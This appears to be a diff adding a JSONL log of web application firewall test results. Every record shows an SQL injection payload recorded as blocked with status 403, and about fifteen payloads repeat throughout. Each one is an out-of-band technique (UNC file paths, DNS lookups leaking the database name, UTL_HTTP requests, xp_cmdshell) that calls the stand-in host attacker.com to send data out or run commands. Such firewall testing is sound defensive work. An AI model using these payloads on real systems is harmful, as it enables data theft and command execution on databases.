@@ -1,0 +1,300 @@
+{"payload": "'; exec master..xp_dirtree '\\\\attacker.com\\share'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0071235189971048385}
+{"payload": "' UNION SELECT 1, LOAD_FILE('\\\\attacker.com\\share')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004019498999696225}
+{"payload": "' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00466244800190907}
+{"payload": "' AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT DATABASE()), '.attacker.com\\log')))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005792948009911925}
+{"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\\\attacker.com\\file'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005683865005266853}
+{"payload": "' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\\log')))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00500944399391301}
+{"payload": "'; DECLARE @q varchar(8000); SET @q='\\attacker.com\\share'; EXEC(@q);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0061648740083910525}
+{"payload": "' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\\attacker.com\\file')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0050834239955293015}
+{"payload": "' UNION SELECT NULL,NULL INTO OUTFILE '\\\\attacker.com\\file'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005661974995746277}
+{"payload": "' AND UTL_HTTP.REQUEST('http://attacker.com/log')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006463879006332718}
+{"payload": "' UNION SELECT 1 INTO OUTFILE '\\\\attacker.com\\share'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005510906004928984}
+{"payload": "'; EXEC('xp_cmdshell ''ping attacker.com''')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00458072499895934}
+{"payload": "'; exec master..xp_fileexist '\\\\attacker.com\\test'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005896552000194788}
+{"payload": "' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\\\attacker.com\\share'))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0044896559993503615}
+{"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\\\attacker.com\\test'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004303672001697123}
+{"payload": "'; exec master..xp_dirtree '\\\\attacker.com\\share'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0047447499964619055}
+{"payload": "' UNION SELECT 1, LOAD_FILE('\\\\attacker.com\\share')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004101232989341952}
+{"payload": "' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004596286002197303}
+{"payload": "' AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT DATABASE()), '.attacker.com\\log')))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004532241990091279}
+{"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\\\attacker.com\\file'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005143147995113395}
+{"payload": "' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\\log')))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004170807005721144}
+{"payload": "'; DECLARE @q varchar(8000); SET @q='\\attacker.com\\share'; EXEC(@q);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038641760038444772}
+{"payload": "' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\\attacker.com\\file')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005459476000396535}
+{"payload": "' UNION SELECT NULL,NULL INTO OUTFILE '\\\\attacker.com\\file'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004527102006250061}
+{"payload": "' AND UTL_HTTP.REQUEST('http://attacker.com/log')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004050003990414552}
+{"payload": "' UNION SELECT 1 INTO OUTFILE '\\\\attacker.com\\share'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004139836993999779}
+{"payload": "'; EXEC('xp_cmdshell ''ping attacker.com''')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006626892994972877}
+{"payload": "'; exec master..xp_fileexist '\\\\attacker.com\\test'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003991913006757386}
+{"payload": "' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\\\attacker.com\\share'))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003659567009890452}
+{"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\\\attacker.com\\test'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005092293999041431}
+{"payload": "'; exec master..xp_dirtree '\\\\attacker.com\\share'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005443585992907174}
+{"payload": "' UNION SELECT 1, LOAD_FILE('\\\\attacker.com\\share')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004517685010796413}
+{"payload": "' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00399214299977757}
+{"payload": "' AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT DATABASE()), '.attacker.com\\log')))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005852256988873705}
+{"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\\\attacker.com\\file'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004032170007121749}
+{"payload": "' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\\log')))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005005266997613944}
+{"payload": "'; DECLARE @q varchar(8000); SET @q='\\attacker.com\\share'; EXEC(@q);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004992902991943993}
+{"payload": "' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\\attacker.com\\file')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004314507998060435}
+{"payload": "' UNION SELECT NULL,NULL INTO OUTFILE '\\\\attacker.com\\file'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004336926998803392}
+{"payload": "' AND UTL_HTTP.REQUEST('http://attacker.com/log')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004986636995454319}
+{"payload": "' UNION SELECT 1 INTO OUTFILE '\\\\attacker.com\\share'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004531992002739571}
+{"payload": "'; EXEC('xp_cmdshell ''ping attacker.com''')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00422837799123954}
+{"payload": "'; exec master..xp_fileexist '\\\\attacker.com\\test'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038831020065117627}
+{"payload": "' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\\\attacker.com\\share'))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004536841996014118}
+{"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\\\attacker.com\\test'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004538046996458434}
+{"payload": "'; exec master..xp_dirtree '\\\\attacker.com\\share'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004553848004434258}
+{"payload": "' UNION SELECT 1, LOAD_FILE('\\\\attacker.com\\share')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0048883270064834505}
+{"payload": "' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.008633945995825343}
+{"payload": "' AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT DATABASE()), '.attacker.com\\log')))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004814654996152967}
+{"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\\\attacker.com\\file'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005163888010429218}
+{"payload": "' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\\log')))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00511918100528419}
+{"payload": "'; DECLARE @q varchar(8000); SET @q='\\attacker.com\\share'; EXEC(@q);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004666057997383177}
+{"payload": "' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\\attacker.com\\file')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0049742440023692325}
+{"payload": "' UNION SELECT NULL,NULL INTO OUTFILE '\\\\attacker.com\\file'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00456000400299672}
+{"payload": "' AND UTL_HTTP.REQUEST('http://attacker.com/log')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004418664000695571}
+{"payload": "' UNION SELECT 1 INTO OUTFILE '\\\\attacker.com\\share'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0072225610056193545}
+{"payload": "'; EXEC('xp_cmdshell ''ping attacker.com''')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005349263999960385}
+{"payload": "'; exec master..xp_fileexist '\\\\attacker.com\\test'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004873717989539728}
+{"payload": "' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\\\attacker.com\\share'))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005365887001971714}
+{"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\\\attacker.com\\test'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005532697003218345}
+{"payload": "'; exec master..xp_dirtree '\\\\attacker.com\\share'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003987733012763783}
+{"payload": "' UNION SELECT 1, LOAD_FILE('\\\\attacker.com\\share')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005523208994418383}
+{"payload": "' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006381230996339582}
+{"payload": "' AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT DATABASE()), '.attacker.com\\log')))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004571037003188394}
+{"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\\\attacker.com\\file'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005375484004616737}
+{"payload": "' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\\log')))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004529717989498749}
+{"payload": "'; DECLARE @q varchar(8000); SET @q='\\attacker.com\\share'; EXEC(@q);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007430340003338642}
+{"payload": "' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\\attacker.com\\file')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004939124992233701}
+{"payload": "' UNION SELECT NULL,NULL INTO OUTFILE '\\\\attacker.com\\file'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006112795002991334}
+{"payload": "' AND UTL_HTTP.REQUEST('http://attacker.com/log')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004221207986120135}
+{"payload": "' UNION SELECT 1 INTO OUTFILE '\\\\attacker.com\\share'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0048650079988874495}
+{"payload": "'; EXEC('xp_cmdshell ''ping attacker.com''')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007264138010214083}
+{"payload": "'; exec master..xp_fileexist '\\\\attacker.com\\test'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005626809987006709}
+{"payload": "' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\\\attacker.com\\share'))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0049211910081794485}
+{"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\\\attacker.com\\test'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005248950998065993}
+{"payload": "'; exec master..xp_dirtree '\\\\attacker.com\\share'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004822331000468694}
+{"payload": "' UNION SELECT 1, LOAD_FILE('\\\\attacker.com\\share')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005361809002351947}
+{"payload": "' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005122525995830074}
+{"payload": "' AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT DATABASE()), '.attacker.com\\log')))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004111782996915281}
+{"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\\\attacker.com\\file'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004610748001141474}
+{"payload": "' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\\log')))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0051439950038911775}
+{"payload": "'; DECLARE @q varchar(8000); SET @q='\\attacker.com\\share'; EXEC(@q);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0049330729962093756}
+{"payload": "' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\\attacker.com\\file')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0061918559949845076}
+{"payload": "' UNION SELECT NULL,NULL INTO OUTFILE '\\\\attacker.com\\file'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005701043992303312}
+{"payload": "' AND UTL_HTTP.REQUEST('http://attacker.com/log')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006065929002943449}
+{"payload": "' UNION SELECT 1 INTO OUTFILE '\\\\attacker.com\\share'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005286594008794054}
+{"payload": "'; EXEC('xp_cmdshell ''ping attacker.com''')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005514822012628429}
+{"payload": "'; exec master..xp_fileexist '\\\\attacker.com\\test'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0050781430036295205}
+{"payload": "' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\\\attacker.com\\share'))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006266060008783825}
+{"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\\\attacker.com\\test'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006132153997896239}
+{"payload": "'; exec master..xp_dirtree '\\\\attacker.com\\share'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006409143999917433}
+{"payload": "' UNION SELECT 1, LOAD_FILE('\\\\attacker.com\\share')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.011914243994397111}
+{"payload": "' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00587530700431671}
+{"payload": "' AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT DATABASE()), '.attacker.com\\log')))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005973795996396802}
+{"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\\\attacker.com\\file'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005293280002661049}
+{"payload": "' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\\log')))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005575820992817171}
+{"payload": "'; DECLARE @q varchar(8000); SET @q='\\attacker.com\\share'; EXEC(@q);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007038597992504947}
+{"payload": "' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\\attacker.com\\file')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006662632004008628}
+{"payload": "' UNION SELECT NULL,NULL INTO OUTFILE '\\\\attacker.com\\file'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00525963598920498}
+{"payload": "' AND UTL_HTTP.REQUEST('http://attacker.com/log')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006971301001613028}
+{"payload": "' UNION SELECT 1 INTO OUTFILE '\\\\attacker.com\\share'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0065692070056684315}
+{"payload": "'; EXEC('xp_cmdshell ''ping attacker.com''')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006951609000680037}
+{"payload": "'; exec master..xp_fileexist '\\\\attacker.com\\test'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004838339998968877}
+{"payload": "' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\\\attacker.com\\share'))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005336600996088237}
+{"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\\\attacker.com\\test'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0042480360134504735}
+{"payload": "'; exec master..xp_dirtree '\\\\attacker.com\\share'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004022820998216048}
+{"payload": "' UNION SELECT 1, LOAD_FILE('\\\\attacker.com\\share')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00394449700252153}
+{"payload": "' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004869800002779812}
+{"payload": "' AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT DATABASE()), '.attacker.com\\log')))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004192389998934232}
+{"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\\\attacker.com\\file'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004500405004364438}
+{"payload": "' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\\log')))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005377448993385769}
+{"payload": "'; DECLARE @q varchar(8000); SET @q='\\attacker.com\\share'; EXEC(@q);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005150591998244636}
+{"payload": "' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\\attacker.com\\file')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004716347000794485}
+{"payload": "' UNION SELECT NULL,NULL INTO OUTFILE '\\\\attacker.com\\file'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007143985989387147}
+{"payload": "' AND UTL_HTTP.REQUEST('http://attacker.com/log')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006013122998410836}
+{"payload": "' UNION SELECT 1 INTO OUTFILE '\\\\attacker.com\\share'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004862163987127133}
+{"payload": "'; EXEC('xp_cmdshell ''ping attacker.com''')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005162268993444741}
+{"payload": "'; exec master..xp_fileexist '\\\\attacker.com\\test'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005070326995337382}
+{"payload": "' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\\\attacker.com\\share'))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00454290299967397}
+{"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\\\attacker.com\\test'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006275136009207927}
+{"payload": "'; exec master..xp_dirtree '\\\\attacker.com\\share'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005750896991230547}
+{"payload": "' UNION SELECT 1, LOAD_FILE('\\\\attacker.com\\share')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005076799992821179}
+{"payload": "' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004576626990456134}
+{"payload": "' AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT DATABASE()), '.attacker.com\\log')))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004179383991868235}
+{"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\\\attacker.com\\file'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0042274260049453005}
+{"payload": "' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\\log')))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005530452996026725}
+{"payload": "'; DECLARE @q varchar(8000); SET @q='\\attacker.com\\share'; EXEC(@q);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00513998199312482}
+{"payload": "' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\\attacker.com\\file')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005229593007243238}
+{"payload": "' UNION SELECT NULL,NULL INTO OUTFILE '\\\\attacker.com\\file'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005807726993225515}
+{"payload": "' AND UTL_HTTP.REQUEST('http://attacker.com/log')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004485548997763544}
+{"payload": "' UNION SELECT 1 INTO OUTFILE '\\\\attacker.com\\share'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007424882991472259}
+{"payload": "'; EXEC('xp_cmdshell ''ping attacker.com''')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006437028001528233}
+{"payload": "'; exec master..xp_fileexist '\\\\attacker.com\\test'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005927895996137522}
+{"payload": "' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\\\attacker.com\\share'))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005911397995078005}
+{"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\\\attacker.com\\test'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004417181000462733}
+{"payload": "'; exec master..xp_dirtree '\\\\attacker.com\\share'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005688353005098179}
+{"payload": "' UNION SELECT 1, LOAD_FILE('\\\\attacker.com\\share')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005086012009996921}
+{"payload": "' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0043811310024466366}
+{"payload": "' AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT DATABASE()), '.attacker.com\\log')))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0045253790012793615}
+{"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\\\attacker.com\\file'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0051092819921905175}
+{"payload": "' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\\log')))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00564342099823989}
+{"payload": "'; DECLARE @q varchar(8000); SET @q='\\attacker.com\\share'; EXEC(@q);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00491607999720145}
+{"payload": "' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\\attacker.com\\file')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0050756689888658}
+{"payload": "' UNION SELECT NULL,NULL INTO OUTFILE '\\\\attacker.com\\file'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005771817013737746}
+{"payload": "' AND UTL_HTTP.REQUEST('http://attacker.com/log')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003853197005810216}
+{"payload": "' UNION SELECT 1 INTO OUTFILE '\\\\attacker.com\\share'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004730093001853675}
+{"payload": "'; EXEC('xp_cmdshell ''ping attacker.com''')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004433651003637351}
+{"payload": "'; exec master..xp_fileexist '\\\\attacker.com\\test'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004616220001480542}
+{"payload": "' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\\\attacker.com\\share'))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004697901007602923}
+{"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\\\attacker.com\\test'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003966366988606751}
+{"payload": "'; exec master..xp_dirtree '\\\\attacker.com\\share'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005852837988641113}
+{"payload": "' UNION SELECT 1, LOAD_FILE('\\\\attacker.com\\share')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004985489998944104}
+{"payload": "' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003765767003642395}
+{"payload": "' AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT DATABASE()), '.attacker.com\\log')))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005220425999141298}
+{"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\\\attacker.com\\file'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0044567799923243}
+{"payload": "' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\\log')))--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004115475996513851}
+{"payload": "'; DECLARE @q varchar(8000); SET @q='\\attacker.com\\share'; EXEC(@q);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0045850689930375665}
+{"payload": "' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\\attacker.com\\file')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006022238012519665}
+{"payload": "' UNION SELECT NULL,NULL INTO OUTFILE '\\\\attacker.com\\file'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004459137009689584}
+{"payload": "' AND UTL_HTTP.REQUEST('http://attacker.com/log')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003654158004792407}
+{"payload": "' UNION SELECT 1 INTO OUTFILE '\\\\attacker.com\\share'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0042281920032110065}
+{"payload": "'; EXEC('xp_cmdshell ''ping attacker.com''')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004359097991255112}
